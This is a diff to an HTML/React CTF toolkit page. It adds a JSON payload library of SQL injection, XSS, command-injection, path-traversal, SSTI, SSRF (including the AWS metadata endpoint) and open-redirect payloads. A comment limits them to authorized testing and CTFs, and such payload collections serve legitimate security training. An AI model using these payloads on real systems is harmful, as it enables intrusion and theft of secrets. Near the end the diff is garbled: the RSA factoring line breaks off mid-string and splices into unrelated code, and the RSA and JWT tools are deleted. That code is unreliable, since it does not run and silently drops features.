@@ -22,7 +22,228 @@
 </head>
 <body>
     <div id="root"></div>
-    <script>
+    
+<script type="application/json" id="payload-library-data">
+{
+  "sqli": [
+    {
+      "name": "Boolean auth bypass (single-quote)",
+      "payload": "' OR '1'='1' -- -",
+      "tags": "auth,boolean",
+      "notes": "Classic boolean-based bypass. May need adaptation to backend/quoting."
+    },
+    {
+      "name": "Boolean auth bypass (double-quote)",
+      "payload": "\" OR \"1\"=\"1\" -- -",
+      "tags": "auth,boolean",
+      "notes": "Useful when input is wrapped in double quotes."
+    },
+    {
+      "name": "Comment truncation",
+      "payload": "admin'-- -",
+      "tags": "auth,comment",
+      "notes": "Tries to comment out the rest of a query after username."
+    },
+    {
+      "name": "UNION basic (3 cols, NULLs)",
+      "payload": "' UNION SELECT NULL,NULL,NULL -- -",
+      "tags": "union",
+      "notes": "Adjust NULL count to match column count."
+    },
+    {
+      "name": "Time delay (MySQL)",
+      "payload": "' OR SLEEP(3) -- -",
+      "tags": "time",
+      "notes": "Simple time-based test (MySQL/MariaDB)."
+    },
+    {
+      "name": "Time delay (PostgreSQL)",
+      "payload": "'; SELECT pg_sleep(3) --",
+      "tags": "time",
+      "notes": "Time-based test (PostgreSQL)."
+    },
+    {
+      "name": "Order by probe",
+      "payload": "' ORDER BY 1 -- -",
+      "tags": "recon",
+      "notes": "Increment ORDER BY to infer column count."
+    },
+    {
+      "name": "Error-based probe",
+      "payload": "' AND 1=CONVERT(int,(SELECT @@version)) --",
+      "tags": "error",
+      "notes": "May trigger visible errors (SQL Server)."
+    }
+  ],
+  "xss": [
+    {
+      "name": "Simple script tag",
+      "payload": "<script>alert(1)<\/script>",
+      "tags": "reflected",
+      "notes": "Works on permissive contexts. Escaped <\/script> is required inside script blocks."
+    },
+    {
+      "name": "IMG onerror",
+      "payload": "<img src=x onerror=alert(1)>",
+      "tags": "reflected",
+      "notes": "Often works when <script> is filtered but attributes pass."
+    },
+    {
+      "name": "SVG onload",
+      "payload": "<svg onload=alert(1)><\/svg>",
+      "tags": "reflected",
+      "notes": "Common alternative vector."
+    },
+    {
+      "name": "Attribute break-out (double quote)",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "tags": "attr",
+      "notes": "Use when injection occurs inside an HTML attribute quoted with \". "
+    },
+    {
+      "name": "HTML event handler",
+      "payload": "<button onclick=alert(1)>click<\/button>",
+      "tags": "dom",
+      "notes": "Basic event-handler test."
+    }
+  ],
+  "cmdi": [
+    {
+      "name": "Command chain (;) + whoami",
+      "payload": "; {CMD}",
+      "tags": "unix",
+      "notes": "Semicolon command chaining; replace {CMD}."
+    },
+    {
+      "name": "Command chain (&&)",
+      "payload": "&& {CMD}",
+      "tags": "unix",
+      "notes": "Runs second command only if first succeeds."
+    },
+    {
+      "name": "Pipe into command (|)",
+      "payload": "| {CMD}",
+      "tags": "unix",
+      "notes": "Pipes output to command; sometimes useful for bypassing."
+    },
+    {
+      "name": "Windows chain (&)",
+      "payload": "& {CMD}",
+      "tags": "windows",
+      "notes": "Windows command separator."
+    },
+    {
+      "name": "Windows chain (&&)",
+      "payload": "&& {CMD}",
+      "tags": "windows",
+      "notes": "Windows conditional chain."
+    }
+  ],
+  "lfi": [
+    {
+      "name": "Linux passwd",
+      "payload": "../../../../../etc/passwd",
+      "tags": "linux",
+      "notes": "Depth may vary; try adding/removing ../ segments."
+    },
+    {
+      "name": "Linux proc self environ",
+      "payload": "../../../../../proc/self/environ",
+      "tags": "linux,proc",
+      "notes": "Sometimes reveals env vars / secrets."
+    },
+    {
+      "name": "Windows hosts",
+      "payload": "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+      "tags": "windows",
+      "notes": "Backslashes for Windows paths."
+    },
+    {
+      "name": "Traversal with URL-encoding (../)",
+      "payload": "..%2f..%2f..%2fetc%2fpasswd",
+      "tags": "encoding",
+      "notes": "Use when raw ../ is filtered."
+    }
+  ],
+  "ssti": [
+    {
+      "name": "Jinja2 basic expression",
+      "payload": "{{7*7}}",
+      "tags": "jinja2",
+      "notes": "If you see 49 rendered, template injection is likely."
+    },
+    {
+      "name": "Handlebars basic",
+      "payload": "{{this}}",
+      "tags": "handlebars",
+      "notes": "Framework detection helper."
+    },
+    {
+      "name": "ERB basic",
+      "payload": "<%= 7*7 %>",
+      "tags": "erb",
+      "notes": "Ruby ERB test."
+    }
+  ],
+  "ssrf": [
+    {
+      "name": "Localhost probe",
+      "payload": "http://127.0.0.1/",
+      "tags": "internal",
+      "notes": "Checks if server can reach localhost."
+    },
+    {
+      "name": "Metadata (AWS)",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "tags": "cloud",
+      "notes": "Cloud metadata endpoint probe (AWS). Use responsibly."
+    },
+    {
+      "name": "Targeted internal host",
+      "payload": "http://{IP}:{PORT}/",
+      "tags": "internal",
+      "notes": "Use placeholders for internal IP/port."
+    }
+  ],
+  "traversal": [
+    {
+      "name": "Path traversal in parameter",
+      "payload": "{TARGET}?{PARAM}=../../../../etc/passwd",
+      "tags": "web",
+      "notes": "Template shows how traversal looks when used in a URL param."
+    },
+    {
+      "name": "Windows traversal in parameter",
+      "payload": "{TARGET}?{PARAM}=..\\..\\..\\Windows\\win.ini",
+      "tags": "web,windows",
+      "notes": "Common Windows file test."
+    }
+  ],
+  "redirect": [
+    {
+      "name": "Open redirect (basic)",
+      "payload": "{TARGET}?next=https://{DOMAIN}/",
+      "tags": "web",
+      "notes": "Adjust parameter name to match app (next/url/redirect/return)."
+    },
+    {
+      "name": "Protocol-relative redirect",
+      "payload": "{TARGET}?next=//{DOMAIN}/",
+      "tags": "web",
+      "notes": "Sometimes bypasses filters that block http(s)://."
+    }
+  ],
+  "jwt": [
+    {
+      "name": "Header/payload placeholder",
+      "payload": "HEADER.{PAYLOAD}.SIGNATURE",
+      "tags": "tokens",
+      "notes": "Use JWT tool to decode/edit/encode. Placeholder entry for workflows."
+    }
+  ]
+}
+</script>
+<script>
         const Icon = ({ d, className = '', style = {} }) => React.createElement('svg', { className, style, width: '24', height: '24', viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round' }, React.createElement('path', { d }));
         const icons = {
             Shield: (p) => Icon({ ...p, d: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' }),
@@ -37,34 +258,24 @@
             Fingerprint: (p) => Icon({ ...p, d: 'M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4' }),
             Key: (p) => Icon({ ...p, d: 'M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4' })
         };
-        const { useState, useEffect, useMemo } = React;
+        const { useState } = React;
         const e = React.createElement;
-        function CTFToolkit() {
+        
+        // Payload library is stored as JSON (not inline JS) to prevent </script> parsing breaks.
+        // This makes the payload system future-proof even with large libraries.
+        function loadPayloadLibrary() {
+            try {
+                const el = document.getElementById('payload-library-data');
+                if (!el) return {};
+                return JSON.parse(el.textContent || '{}');
+            } catch (e) {
+                console.error('Failed to load payload library JSON', e);
+                return {};
+            }
+        }
+function CTFToolkit() {
             const [activeCategory, setActiveCategory] = useState('crypto');
             const [activeTool, setActiveTool] = useState('multi-codec');
-            const [toolQuery, setToolQuery] = useState('');
-            const [favorites, setFavorites] = useState(() => {
-                try { return JSON.parse(localStorage.getItem('cypher_favs') || '[]'); } catch(e) { return []; }
-            });
-            const [recent, setRecent] = useState(() => {
-                try { return JSON.parse(localStorage.getItem('cypher_recent') || '[]'); } catch(e) { return []; }
-            });
-
-            useEffect(() => { try { localStorage.setItem('cypher_favs', JSON.stringify(favorites)); } catch(e) {} }, [favorites]);
-            useEffect(() => { try { localStorage.setItem('cypher_recent', JSON.stringify(recent)); } catch(e) {} }, [recent]);
-
-            const selectTool = (id) => {
-                setActiveTool(id);
-                setRecent(prev => {
-                    const next = [id, ...prev.filter(x => x !== id)].slice(0, 8);
-                    return next;
-                });
-            };
-
-            const toggleFavorite = (id) => {
-                setFavorites(prev => prev.includes(id) ? prev.filter(x => x !== id) : [id, ...prev].slice(0, 24));
-            };
-
             const categories = [
                 { id: 'crypto', name: 'Cryptography', icon: 'Lock', color: '#00ff41' },
                 { id: 'web', name: 'Web Exploitation', icon: 'Globe', color: '#00d9ff' },
@@ -112,30 +323,6 @@
             };
             const currentCategory = categories.find(c => c.id === activeCategory);
             const currentTools = tools[activeCategory] || [];
-
-            const filteredTools = useMemo(() => {
-                const q = toolQuery.trim().toLowerCase();
-                const list = currentTools.slice();
-                // If query is empty, float favorites + recents to top
-                if (!q) {
-                    list.sort((a,b) => {
-                        const af = favorites.includes(a.id) ? 1 : 0;
-                        const bf = favorites.includes(b.id) ? 1 : 0;
-                        if (af !== bf) return bf - af;
-                        const ar = recent.includes(a.id) ? 1 : 0;
-                        const br = recent.includes(b.id) ? 1 : 0;
-                        if (ar !== br) return br - ar;
-                        return a.name.localeCompare(b.name);
-                    });
-                    return list;
-                }
-                return list.filter(t =>
-                    (t.name || '').toLowerCase().includes(q) ||
-                    (t.desc || '').toLowerCase().includes(q) ||
-                    (t.id || '').toLowerCase().includes(q)
-                );
-            }, [currentTools, toolQuery, favorites, recent]);
-
             return e('div', { className: 'min-h-screen bg-[#0a0e1a] text-[#e0e0e0] font-mono overflow-hidden' },
                 e('div', { className: 'fixed inset-0 opacity-20 pointer-events-none' },
                     e('div', { className: 'absolute inset-0', style: { backgroundImage: 'linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px)', backgroundSize: '50px 50px', animation: 'gridScroll 20s linear infinite' }})
@@ -195,29 +382,15 @@
                                     e('h2', { className: 'text-xl font-bold uppercase tracking-wider', style: { color: currentCategory.color }}, currentCategory.name),
                                     e('div', { className: 'h-px flex-1 bg-gradient-to-r from-transparent via-[#00ff41]/50 to-transparent' })
                                 ),
-                                e('div', { className: 'mb-3 flex gap-2 items-center' },
-                                    e('input', {
-                                        type: 'text',
-                                        value: toolQuery,
-                                        onChange: (ev) => setToolQuery(ev.target.value),
-                                        placeholder: 'Search tools… (name, desc, id)',
-                                        className: 'w-full px-3 py-2 rounded bg-[#0a0e1a]/70 border border-gray-700 text-sm text-gray-200 focus:border-[#00ff41] focus:outline-none'
-                                    }),
-                                    e('button', {
-                                        onClick: () => setToolQuery(''),
-                                        className: 'px-3 py-2 rounded bg-gray-800/60 border border-gray-700 text-xs font-bold hover:border-gray-500'
-                                    }, 'CLEAR')
-                                ),
                                 e('div', { className: 'grid grid-cols-2 gap-4' },
-                                    ...filteredTools.map(tool => {
+                                    ...currentTools.map(tool => {
                                         const isActive = activeTool === tool.id;
                                         return e('button', {
                                             key: tool.id,
-                                            onClick: () => selectTool(tool.id),
-                                            className: `tool-card relative text-left p-5 rounded-lg border transition-all ${isActive ? 'bg-gradient-to-br from-[#00ff41]/10 to-transparent border-[#00ff41]' : 'bg-[#0f1419]/80 border-gray-800 hover:border-gray-600'}`
+                                            onClick: () => setActiveTool(tool.id),
+                                            className: `tool-card text-left p-5 rounded-lg border transition-all ${isActive ? 'bg-gradient-to-br from-[#00ff41]/10 to-transparent border-[#00ff41]' : 'bg-[#0f1419]/80 border-gray-800 hover:border-gray-600'}`
                                         },
-                                            e('button', { onClick: (ev) => { ev.stopPropagation(); toggleFavorite(tool.id); }, className: `absolute top-3 right-3 text-lg leading-none ${favorites.includes(tool.id) ? 'text-yellow-300' : 'text-gray-500'} hover:text-yellow-200` }, favorites.includes(tool.id) ? '★' : '☆'),
-                                            e('h3', { className: 'font-bold mb-2 pr-6', style: { color: isActive ? currentCategory.color : '#e0e0e0' }}, tool.name),
+                                            e('h3', { className: 'font-bold mb-2', style: { color: isActive ? currentCategory.color : '#e0e0e0' }}, tool.name),
                                             e('p', { className: 'text-xs text-gray-400' }, tool.desc)
                                         );
                                     })
@@ -369,35 +542,8 @@ const caesarCipher = (text, s, d = false) => { const sh = d ? (26 - (s % 26)) : 
             if (tool === 'rsa-toolkit') {
                 const gcd = (a, b) => b === 0 ? a : gcd(b, a % b);
                 const modInverse = (a, m) => { let [or, r] = [a, m]; let [os, s] = [1, 0]; while (r !== 0) { const q = Math.floor(or / r); [or, r] = [r, or - q * r]; [os, s] = [s, os - q * s]; } return os < 0 ? os + m : os; };
-                const factorN = () => { const mod = parseInt(rsaN); if (isNaN(mod) || mod < 4) { setOutput('Invalid'); return; } for (let i = 2; i <= Math.sqrt(mod); i++) { if (mod % i === 0) { setRsaP(i.toString()); setRsaQ((mod/i).toString()); setOutput(`p = ${i}\nq = ${mod/i}`); return; }} setOutput('Cannot factor'); };
-                const calcPrivate = () => { const pv = parseInt(rsaP), qv = parseInt(rsaQ), ev = parseInt(rsaE); if (isNaN(pv) || isNaN(qv) || isNaN(ev)) { setOutput('Invalid'); return; } const nc = pv * qv; const phi = (pv - 1) * (qv - 1); if (gcd(ev, phi) !== 1) { setOutput('e and φ(n) not coprime'); return; } const d = modInverse(ev, phi); setRsaN(nc.toString()); setOutput(`n = ${nc}\nφ(n) = ${phi}\nd = ${d}`); };
-                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'RSA Calculator'),
-                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('input', { type: 'text', value: rsaN, onChange: (ev) => setRsaN(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'n' }), e('input', { type: 'text', value: rsaE, onChange: (ev) => setRsaE(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'e' })),
-                    e('button', { onClick: factorN, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'FACTOR n'),
-                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('input', { type: 'text', value: rsaP, onChange: (ev) => setRsaP(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'p' }), e('input', { type: 'text', value: rsaQ, onChange: (ev) => setRsaQ(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'q' })),
-                    e('button', { onClick: calcPrivate, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, 'CALC PRIVATE KEY'),
-                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
-                );
-            }
-
-            // JWT TOOLKIT
-            if (tool === 'jwt-toolkit') {
-                const decodeJWT = () => { try { const parts = input.split('.'); if (parts.length !== 3) { setOutput('Invalid JWT'); return; } const h = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/'))); const p = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))); setJwtHeader(JSON.stringify(h, null, 2)); setJwtPayload(JSON.stringify(p, null, 2)); setJwtSig(parts[2]); setOutput('Decoded'); } catch(e) { setOutput('Error: ' + e.message); }};
-                const forgeJWT = () => { try { const h = JSON.parse(jwtHeader); const p = JSON.parse(jwtPayload); const b64url = (s) => btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''); const nh = b64url(JSON.stringify(h)); const np = b64url(JSON.stringify(p)); setOutput(`${nh}.${np}.${jwtSig}`); } catch(e) { setOutput('Error'); }};
-                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'JWT Swiss Army Knife'),
-                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-20 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Paste JWT...' }),
-                    e('button', { onClick: decodeJWT, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, e(icons.Key, { className: 'w-4 h-4 inline mr-2' }), 'DECODE'),
-                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: jwtHeader, onChange: (ev) => setJwtHeader(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-xs font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Header' }), e('textarea', { value: jwtPayload, onChange: (ev) => setJwtPayload(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-xs font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Payload' })),
-                    e('input', { type: 'text', value: jwtSig, onChange: (ev) => setJwtSig(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Signature' }),
-                    e('button', { onClick: forgeJWT, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'FORGE'),
-                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
-                );
-            }
-
-            // PAYLOAD GENERATOR
-if (tool === 'payload-gen') {
-    // NOTE: This library is intended for authorized testing / CTF use. Avoid using against systems you don't own or have permission to test.
-    const encodeHtml = (s) => (s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+                const factorN = () => { const mod = parseInt(rsaN); if (isNaN(mod) || mod < 4) { setOutput('Invalid'); return; } for (let i = 2; i <= Math.sqrt(mod); i++) { if (mod % i === 0) { setRsaP(i.toString()); setRsaQ((mod/i).toString()); setOutput(`p = $const library = loadPayloadLibrary();
+e(/"/g, '&quot;').replace(/'/g, '&#39;');
     const base64Encode = (s) => {
         try {
             const bytes = new TextEncoder().encode(s ?? '');
